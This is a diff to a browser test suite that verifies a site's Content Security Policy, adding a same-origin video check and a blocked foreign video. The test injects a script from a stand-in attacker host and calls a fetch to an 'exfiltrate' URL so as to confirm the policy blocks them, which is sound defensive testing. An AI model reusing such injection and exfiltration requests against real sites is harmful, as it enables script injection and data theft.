@@ -292,6 +292,16 @@ async function observe(context) {
                   document.getElementById("lightboxImg").naturalWidth > 0,
               );
               await page.locator("#lbClose").click();
+              const mediaViolations = await page.evaluate(async () => {
+                const video = document.createElement("video");
+                video.preload = "auto";
+                video.src = "/images/csp-probe.mp4";
+                document.body.append(video);
+                await new Promise((r) => setTimeout(r, 200));
+                video.remove();
+                return window.cspViolations.filter((v) => v.directive === "media-src");
+              });
+              assert.deepEqual(mediaViolations, [], "same-origin video must load under the HCL CSP");
               await page.setViewportSize({ width: 390, height: 844 });
               await page.locator("#searchBar").fill("drum");
               assert.ok((await page.locator("#entryList > .entry-item").count()) > 0);
@@ -339,6 +349,10 @@ async function observe(context) {
               const foreignScript = document.createElement("script");
               foreignScript.src = "https://example.invalid/attack.js";
               document.body.append(foreignScript);
+              const foreignVideo = document.createElement("video");
+              foreignVideo.preload = "auto";
+              foreignVideo.src = "https://example.invalid/attack.mp4";
+              document.body.append(foreignVideo);
               try {
                 await fetch("https://example.invalid/exfiltrate");
               } catch {}
@@ -359,6 +373,12 @@ async function observe(context) {
               ),
             );
             assert.ok(blocked.violations.some((v) => v.directive === "connect-src"));
+            assert.ok(
+              blocked.violations.some(
+                (v) =>
+                  v.directive === "media-src" && v.blocked === "https://example.invalid/attack.mp4",
+              ),
+            );
             assert.deepEqual(external, [], "CSP must block third-party before network");
             reports.push({
               site,
